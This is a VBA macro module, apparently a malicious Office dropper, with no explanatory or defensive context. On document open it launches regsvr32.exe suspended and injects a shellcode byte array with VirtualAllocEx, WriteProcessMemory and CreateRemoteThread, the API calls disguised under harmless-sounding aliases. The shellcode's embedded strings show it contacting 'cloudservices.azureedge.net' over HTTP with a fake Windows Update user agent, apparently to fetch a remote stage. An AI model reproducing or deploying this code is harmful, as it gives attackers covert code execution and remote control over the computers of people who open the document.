Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

#If VBA7 Then
    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If

Sub Auto_Open()
    Dim myByte As Long, myArray As Variant, offset As Long
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String

#If VBA7 Then
    Dim rwxpage As LongPtr, res As LongPtr
#Else
    Dim rwxpage As Long, res As Long
#End If
myArray = Array(-4, -24, -119, 0, 0, 0, 96, -119, -27, 49, -46, 100, -117, 82, 48, -117, 82, 12, -117, 82, 20, -117, 114, 40, 15, -73, 74, 38, 49, -1, 49, -64, -84, 60, 97, 124, 2, 44, 32, -63, -49, _
13, 1, -57, -30, -16, 82, 87, -117, 82, 16, -117, 66, 60, 1, -48, -117, 64, 120, -123, -64, 116, 74, 1, -48, 80, -117, 72, 24, -117, 88, 32, 1, -45, -29, 60, 73, -117, 52, -117, 1, _
-42, 49, -1, 49, -64, -84, -63, -49, 13, 1, -57, 56, -32, 117, -12, 3, 125, -8, 59, 125, 36, 117, -30, 88, -117, 88, 36, 1, -45, 102, -117, 12, 75, -117, 88, 28, 1, -45, -117, 4, _
-117, 1, -48, -119, 68, 36, 36, 91, 91, 97, 89, 90, 81, -1, -32, 88, 95, 90, -117, 18, -21, -122, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 84, 104, 76, 119, 38, 7, -1, _
-43, -24, 0, 0, 0, 0, 49, -1, 87, 87, 87, 87, 87, 104, 58, 86, 121, -89, -1, -43, -23, -92, 0, 0, 0, 91, 49, -55, 81, 81, 106, 3, 81, 81, 104, -69, 1, 0, 0, 83, _
80, 104, 87, -119, -97, -58, -1, -43, 80, -23, -116, 0, 0, 0, 91, 49, -46, 82, 104, 0, 50, -64, -124, 82, 82, 82, 83, 82, 80, 104, -21, 85, 46, 59, -1, -43, -119, -58, -125, -61, _
80, 104, -128, 51, 0, 0, -119, -32, 106, 4, 80, 106, 31, 86, 104, 117, 70, -98, -122, -1, -43, 95, 49, -1, 87, 87, 106, -1, 83, 86, 104, 45, 6, 24, 123, -1, -43, -123, -64, 15, _
-124, -54, 1, 0, 0, 49, -1, -123, -10, 116, 4, -119, -7, -21, 9, 104, -86, -59, -30, 93, -1, -43, -119, -63, 104, 69, 33, 94, 49, -1, -43, 49, -1, 87, 106, 7, 81, 86, 80, 104, _
-73, 87, -32, 11, -1, -43, -65, 0, 47, 0, 0, 57, -57, 117, 7, 88, 80, -23, 123, -1, -1, -1, 49, -1, -23, -111, 1, 0, 0, -23, -55, 1, 0, 0, -24, 111, -1, -1, -1, 47, _
77, 77, 88, 106, 0, -105, -40, 86, -104, -26, 7, 111, 57, 82, 20, -89, 0, -82, -54, -94, 18, -29, -15, 82, -37, 83, -119, -72, 94, -100, 84, -23, -41, 63, -68, -67, 13, 111, 44, 122, _
7, 111, -54, 7, -33, 9, -7, -48, -60, 33, -22, 25, -42, -43, 84, -103, -51, 31, 79, -121, 68, 59, -26, 123, 116, -64, -124, 58, -3, 57, 95, 64, -74, 117, -23, 47, -82, 79, 0, 72, _
111, 115, 116, 58, 32, 99, 108, 111, 117, 100, 115, 101, 114, 118, 105, 99, 101, 115, 46, 97, 122, 117, 114, 101, 101, 100, 103, 101, 46, 110, 101, 116, 13, 10, 85, 115, 101, 114, 45, 65, _
103, 101, 110, 116, 58, 32, 87, 105, 110, 100, 111, 119, 115, 45, 85, 112, 100, 97, 116, 101, 45, 65, 103, 101, 110, 116, 47, 49, 48, 46, 48, 46, 49, 48, 48, 49, 49, 46, 49, 54, _
51, 56, 52, 32, 67, 108, 105, 101, 110, 116, 45, 80, 114, 111, 116, 111, 99, 111, 108, 47, 49, 46, 52, 48, 13, 10, 0, -39, 74, 0, 10, 34, 125, -26, 38, -128, 68, -13, -38, 40, _
-74, -11, 100, -59, -95, 123, 75, 98, -110, 62, 39, -63, 81, -74, -85, 127, 56, 102, -86, 114, 73, -121, -55, -15, 54, -68, 50, 2, -112, -40, 58, 45, 63, -58, 56, -86, -35, -123, 119, -5, _
20, 100, 7, 33, -68, 101, -111, 6, 111, -105, -65, 106, 14, 85, -4, -51, -103, 86, -99, 85, -55, -17, 108, -93, -31, -42, 6, 98, -4, 56, -114, -9, -116, 121, 124, 79, 89, -76, 4, 21, _
36, 43, 117, -124, 19, -92, 5, 73, 116, -70, -98, 1, -62, -102, 98, 25, 68, -123, -28, 42, -98, 79, 38, -61, -13, -73, -100, 25, 85, 46, -97, -33, -118, -65, 29, 86, 86, -96, -26, 3, _
-90, 117, 114, -42, 58, 4, -16, -114, 17, 85, 55, 62, -41, 116, -34, -36, -9, -62, 76, -26, 103, 96, 64, 53, -86, -28, -100, 119, -22, -70, 98, 21, -77, -101, -14, -74, -83, 83, -29, 49, _
14, -24, 13, -78, -8, -120, -65, -113, -113, -20, -123, -70, -76, 89, -15, -119, -34, -106, 30, 19, -75, 116, 0, 104, -16, -75, -94, 86, -1, -43, 106, 64, 104, 0, 16, 0, 0, 104, 0, 0, _
64, 0, 87, 104, 88, -92, 83, -27, -1, -43, -109, -71, 0, 0, 0, 0, 1, -39, 81, 83, -119, -25, 87, 104, 0, 32, 0, 0, 83, 86, 104, 18, -106, -119, -30, -1, -43, -123, -64, 116, _
-58, -117, 7, 1, -61, -123, -64, 117, -27, 88, -61, -24, -119, -3, -1, -1, 99, 108, 111, 117, 100, 115, 101, 114, 118, 105, 99, 101, 115, 46, 97, 122, 117, 114, 101, 101, 100, 103, 101, 46, _
110, 101, 116, 0, 56, 99, -6, 120)
    If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\regsvr32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\regsvr32.exe"
    End If

    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
